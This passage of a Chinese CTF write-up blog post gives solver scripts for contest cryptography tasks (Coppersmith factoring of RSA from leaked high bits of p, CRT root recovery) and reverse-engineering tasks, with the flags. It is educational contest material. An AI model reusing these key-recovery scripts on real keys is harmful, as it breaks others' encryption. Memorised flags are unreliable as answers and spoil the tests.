class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    s = ss + ii * (p-<span class="hljs-number">1</span>) // <span class="hljs-number">6</span><br>    D = G^<span class="hljs-built_in">int</span>(s)<br>    K = <span class="hljs-built_in">list</span>(D*S*D)<br>    key = <span class="hljs-built_in">sum</span>(K[<span class="hljs-number">0</span>])+<span class="hljs-built_in">sum</span>(K[<span class="hljs-number">1</span>])+<span class="hljs-built_in">sum</span>(K[<span class="hljs-number">2</span>])<br>    mask = <span class="hljs-built_in">int</span>(sha256(<span class="hljs-built_in">str</span>(key).encode()).hexdigest(),<span class="hljs-number">16</span>)<br>    pt = ct ^^ mask<br>    <span class="hljs-keyword">if</span>(D.det()*detE*D.det() == detF):<br>        <span class="hljs-built_in">print</span>(long_to_bytes(pt))<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#QAQ~4_Br0ken_Crypto_Sy5tem~TAT</span><br></code></pre></td></tr></table></figure>

<h3 id="5-4"><a href="#5-4" class="headerlink" title="5-4"></a>5-4</h3><p>p高位泄露，采用coppersmith分解n，之后解椭圆曲线求m即得flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">135133139540786818977969958456509467902948924003478556140490841984247464940261764739984274397650928404945721248284577232814352745333641188749824519153271662051302477973525156608141358709265683759057060630360909926255299541198485901065352661702656282587105799982740927802530997159098015074633017964344230291287</span><br><span class="hljs-comment"># leak_p = 115314121469787984258489158421056136177545051135641551928888818017665807264468</span><br>c = <span class="hljs-number">1836794759996264077871820946090708779709415760553736759453665641907562256633157424959089180650539327925671892742819931875681606982615287882656254828326465758462357812873839261469783652663796071814218493268788421243190729887313099383264588659922912876424206670310928514588754069909128149471326084547056385690037197908766053620702238356084124023146075698878494434053246157524775269473152458661801907641122308756667762880284617915774590075511686821816948174618196839335059944389423693187930672934293905608970421003536691336581450927887931599275461176935079227494931457562345640133982771901848553204154760760399724074615092290799119053032875792219794072963200108352944441876206386518960615891547166767499506114294860833404421893612197040731184031783165365621722947731966143226777081983415797778111715332055871302609049501876860012070502369090417942239749695034267695710324328867728296996779</span><br>pbits = <span class="hljs-number">512</span><br><br><span class="hljs-comment"># leak_p = 57303545022436031674172379509633863887077</span><br><span class="hljs-comment"># print(hex(leak_p&lt;&lt;8))</span><br><span class="hljs-comment"># leak_p = 0xa8666553ec59acad3ed8208f060abba8e500</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>**<span class="hljs-number">24</span>):<br>    leak_p = <span class="hljs-number">0xfef17ad62b2573f0f1fd707b2f273922860034731234b9ba82fc303b7c4faad4</span><br>    leak_p = leak_p + <span class="hljs-built_in">int</span>(<span class="hljs-built_in">hex</span>(i),<span class="hljs-number">16</span>)<br><span class="hljs-comment">#     print(leak_p)</span><br><br>    kbits = pbits - leak_p.nbits()  <span class="hljs-comment"># 设置界的 bit上限</span><br>    <span class="hljs-comment">#print(kbits)</span><br><br>    p_high = leak_p &lt;&lt; kbits<br>    PR.&lt;x&gt; = PolynomialRing(Zmod(n))<br>    f = p_high + x<br>    roots = f.small_roots(X=<span class="hljs-number">2</span>^kbits, beta=<span class="hljs-number">0.4</span>)  <span class="hljs-comment">#计算模多项式的小整数根</span><br><br>    <span class="hljs-keyword">if</span>(roots):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;roots =&#x27;</span>,roots)<br>        p = p_high + <span class="hljs-built_in">int</span>(roots[<span class="hljs-number">0</span>])<br>        q = n//<span class="hljs-built_in">int</span>(p)<br>        <span class="hljs-keyword">assert</span> p*q == n<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p=&quot;</span>,p)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q=&quot;</span>,q)<br>        phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>        d = invert(e,phi)<br>        flag = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,d,n))<br>        <span class="hljs-built_in">print</span>(long_to_bytes(flag))<br></code></pre></td></tr></table></figure>

<h3 id="5-5"><a href="#5-5" class="headerlink" title="5-5"></a>5-5</h3><p>先联立n和hint解p，q，再计算发现是ct &#x3D; pow(m,672,n)，e实际为672，与p-1，q-1均不互素，采用中国剩余定理求解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs Python"> p =  <span class="hljs-number">5437194409937079365796361293969364604939627149039784073055530959237847229851327425147129937145179737622218931435682823431052499320577471182347267982471329</span><br>q = <span class="hljs-number">6702589700303909273170909376593932709002828248723758321037524045275822447495902310058252026284620026874261411365267847853883194081655189179013810230756257</span><br>e = <span class="hljs-number">672</span><br>c = <span class="hljs-number">24482128269957355675512496312977308128712253968496848873519792376434347925427116612997489113223781321628516365811583310346553402215907938918891908853234881284620764982626375301219763593402089309909155204943747718536894186749932544428588048770663458669109073657836937287831725958017345747881678942488157429000</span><br><br>R.&lt;x&gt; = Zmod(p)[]<br>f = x ^ e - c<br>f = f.monic()<br>res1 = f.roots()<br><span class="hljs-built_in">print</span>(res1)<br><span class="hljs-comment">#类似方法求res2</span><br><br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-comment">#循环使用中国剩余定理</span><br><br>res1 =..<br>res2 =..<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res1:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> res2:<br>        m = libnum.solve_crt([<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(j[<span class="hljs-number">0</span>])],[p,q])<br>        flag = long_to_bytes(m)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;CTF&#x27;</span>  <span class="hljs-keyword">in</span> flag:<br>            <br>            <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>            <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908618.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>FastP0w3r_4nd_AMM_0f_R5A</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="6-1"><a href="#6-1" class="headerlink" title="6-1"></a>6-1</h3><p>程序逻辑</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908642.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><code>main_tmp</code>给了初始值0xDEAD,<code>v12(enc)</code>开起动调发现是定值，直接dump出来就行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>index = <span class="hljs-number">0xDEAD</span><br>tmp = []<br><br>enc=[<span class="hljs-number">0x00000000000022B9</span>, <span class="hljs-number">0x000000000000C9F8</span>, <span class="hljs-number">0x0000000000008C89</span>, <span class="hljs-number">0x000000000000FF18</span>, <span class="hljs-number">0x0000000000001439</span>, <span class="hljs-number">0x0000000000004E0A</span>, <span class="hljs-number">0x0000000000002A8B</span>, <span class="hljs-number">0x00000000000007CB</span>, <span class="hljs-number">0x000000000000BDEB</span>, <span class="hljs-number">0x000000000000FAAB</span>, <span class="hljs-number">0x0000000000003FFB</span>, <span class="hljs-number">0x000000000000784B</span>, <span class="hljs-number">0x0000000000009F1E</span>, <span class="hljs-number">0x0000000000004FEB</span>, <span class="hljs-number">0x0000000000004D0B</span>, <span class="hljs-number">0x000000000000D08E</span>, <span class="hljs-number">0x00000000000038BB</span>, <span class="hljs-number">0x000000000000CBAE</span>, <span class="hljs-number">0x000000000000D2CE</span>, <span class="hljs-number">0x000000000000913E</span>, <span class="hljs-number">0x0000000000000A6B</span>, <span class="hljs-number">0x000000000000F03B</span>, <span class="hljs-number">0x000000000000507B</span>, <span class="hljs-number">0x000000000000398B</span>, <span class="hljs-number">0x00000000000093DE</span>, <span class="hljs-number">0x0000000000003CCE</span>, <span class="hljs-number">0x000000000000459E</span>, <span class="hljs-number">0x0000000000004ABE</span>, <span class="hljs-number">0x000000000000553E</span>, <span class="hljs-number">0x000000000000316E</span>, <span class="hljs-number">0x00000000000033BE</span>, <span class="hljs-number">0x00000000000042FE</span>, <span class="hljs-number">0x000000000000CECE</span>, <span class="hljs-number">0x0000000000004DDE</span>, <span class="hljs-number">0x000000000000982B</span>, <span class="hljs-number">0x000000000000A31B</span>, <span class="hljs-number">0x000000000000802E</span>, <span class="hljs-number">0x00000000000012EE</span>, <span class="hljs-number">0x000000000000F67A</span>, <span class="hljs-number">0x000000000000EB79</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>    index = <span class="hljs-number">0x123</span> * index + <span class="hljs-number">0x456</span><br>    index = index % <span class="hljs-number">65536</span> <br>    tmp.append(index)<br><span class="hljs-comment"># print(tmp)</span><br><br>flag_1=[]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0xffff</span>):<br>        <span class="hljs-keyword">if</span>(j^tmp[i] == enc[i]):<br>            <span class="hljs-built_in">print</span>(j,end=<span class="hljs-string">&quot;, &quot;</span>)<br>            flag_1.append(j)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag_1)<br><br>flag=<span class="hljs-string">&quot;&quot;</span> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">39</span>,<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>    flag_1[i] = (flag_1[i] &gt;&gt; <span class="hljs-number">4</span>) | ((flag_1[i-<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xff</span>)<br>    flag = <span class="hljs-built_in">chr</span>(flag_1[i]) + flag<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;DA&#x27;</span>+flag)<br></code></pre></td></tr></table></figure>

<h3 id="6-2"><a href="#6-2" class="headerlink" title="6-2"></a>6-2</h3><p>这段去花</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908545.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>程序逻辑</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908822.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>中序遍历</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908864.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>后续遍历</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908677.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>还原二叉树，层次遍历得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TreeNode</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, value</span>):<br>        <span class="hljs-variable language_">self</span>.value = value<br>        <span class="hljs-variable language_">self</span>.left = <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.right = <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_tree</span>(<span class="hljs-params">inorder, postorder</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inorder <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> postorder:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    root_value = postorder.pop()<br>    root = TreeNode(root_value)<br><br>    inorder_index = inorder.index(root_value)<br><br>    root.right = build_tree(inorder[inorder_index + <span class="hljs-number">1</span>:], postorder)<br>    root.left = build_tree(inorder[:inorder_index], postorder)<br>    <br>    <span class="hljs-keyword">return</span> root<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">preorder_traversal</span>(<span class="hljs-params">root</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> root:<br>        <span class="hljs-keyword">return</span> []<br>    <br>    result = [root.value] <br>    result += preorder_traversal(root.left)  <br>    result += preorder_traversal(root.right) <br>    <br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inorder_traversal</span>(<span class="hljs-params">root</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> root:<br>        <span class="hljs-keyword">return</span> []<br>    <br>    result = inorder_traversal(root.left) <br>    result.append(root.value)<br>    result += inorder_traversal(root.right) <br>    <br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">postorder_traversal</span>(<span class="hljs-params">root</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> root:<br>        <span class="hljs-keyword">return</span> []<br>    <br>    result = postorder_traversal(root.left) <br>    result += postorder_traversal(root.right) <br>    result.append(root.value) <br>    <br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">preorder_traversal</span>(<span class="hljs-params">root</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> root:<br>        <span class="hljs-keyword">return</span> []<br>    <br>    result = [root.value]  <br>    result += preorder_traversal(root.left)  <br>    result += preorder_traversal(root.right) <br>    <br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">level_order_traversal</span>(<span class="hljs-params">root</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> root:<br>        <span class="hljs-keyword">return</span> []<br><br>    result = []<br>    queue = [root]<br><br>    <span class="hljs-keyword">while</span> queue:<br>        level_size = <span class="hljs-built_in">len</span>(queue)<br>        level_nodes = []<br><br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(level_size):<br>            node = queue.pop(<span class="hljs-number">0</span>)<br>            level_nodes.append(node.value)<br><br>            <span class="hljs-keyword">if</span> node.left:<br>                queue.append(node.left)<br>            <span class="hljs-keyword">if</span> node.right:<br>                queue.append(node.right)<br><br>        result.append(<span class="hljs-string">&#x27;&#x27;</span>.join(level_nodes))  <br><br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-comment"># 中序遍历和后序遍历的结果</span><br>inorder = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;ja7Cws_A3daTd4qDo8&#125;F_Sd&#123;a&quot;</span>)<br>postorder = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;j7aw_sC3addq4TAo&#125;8_Fda&#123;SD&quot;</span>)<br><br><span class="hljs-comment"># 构建二叉树</span><br>root = build_tree(inorder, postorder)<br><br><span class="hljs-comment"># 获取层次遍历的结果</span><br>level_order_result = level_order_traversal(root)<br><br><span class="hljs-keyword">for</span> level <span class="hljs-keyword">in</span> level_order_result:<br>    <span class="hljs-built_in">print</span>(level,end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#DASCTF&#123;asd48_daj7w_3adqo&#125;</span><br></code></pre></td></tr></table></figure>

<h3 id="6-3"><a href="#6-3" class="headerlink" title="6-3"></a>6-3</h3><p>这一段反复动调</p>
<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908047.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ul>
<li>这个脚本里面的delta和data是从程序里面提取出来的</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs Python">delta = [<span class="hljs-number">0xBBDBD183</span>,<span class="hljs-number">0x5340F2E</span>,<span class="hljs-number">0xBEEFDEAD</span>]<br>data = [<span class="hljs-number">858337624</span>, <span class="hljs-number">1618346513</span>, <span class="hljs-number">1108893510</span>, <span class="hljs-number">1668575017</span>]<br>v1 = data[<span class="hljs-number">3</span>]<br>v2 = data[<span class="hljs-number">2</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>    key = delta[i%<span class="hljs-number">3</span>]<br>    <span class="hljs-keyword">if</span>(key == <span class="hljs-number">0xBBDBD183</span>):<br>        tmp = v1<br>        v1 = v1 ^ key<br>        v1 = ((v1 &amp; <span class="hljs-number">0xff</span>) &lt;&lt; <span class="hljs-number">16</span>) | ((v1 &amp; <span class="hljs-number">0xff00</span>)) | ((v1 &amp; <span class="hljs-number">0xff0000</span>) &lt;&lt; <span class="hljs-number">8</span>) | ((v1 &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt; <span class="hljs-number">24</span>)<br>        v1 = v1 ^ key<br>        v1 = v1 ^ v2<br>        v2 = tmp<br>    <span class="hljs-keyword">elif</span>(key == <span class="hljs-number">0x5340F2E</span>):<br>        tmp = v1<br>        v1 = v2 ^ v1<br>        v2 = tmp<br>    <span class="hljs-keyword">else</span>:<br>        tmp = v1<br>        v1 = v1 ^ key<br>        v1 = ((v1 &amp; <span class="hljs-number">0xff</span>) &lt;&lt; <span class="hljs-number">16</span>) | ((v1 &amp; <span class="hljs-number">0xff00</span>) &gt;&gt; <span class="hljs-number">8</span>) | ((v1 &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">8</span>) | ((v1 &amp; <span class="hljs-number">0xff000000</span>))<br>        v1 = v1 ^ key<br>        v1 = v1 ^ v2<br>        v2 = tmp<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;v2:x&#125;</span>&quot;</span>,end=<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;v1:x&#125;</span>&quot;</span>,end=<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-comment">#216c306f6f435f30</span><br><span class="hljs-comment">#逆序转换为字符</span><br>z1g_I3_S0_Coo0l!<br></code></pre></td></tr></table></figure>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF-Writeup/" class="category-chain-item">CTF-Writeup</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>2024 楚慧杯 Writeup</div>
      <div>http://example.com/2024/12/20/2024 楚慧杯 wp/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>XU17</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年12月20日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              XU17
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/12/20/WAFPecker/" title="WAFPecker">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">WAFPecker</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/12/20/SSTI-fenjing-%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/" title="SSTI-fenjing-思路总结">
                        <span class="hidden-mobile">SSTI-fenjing-思路总结</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
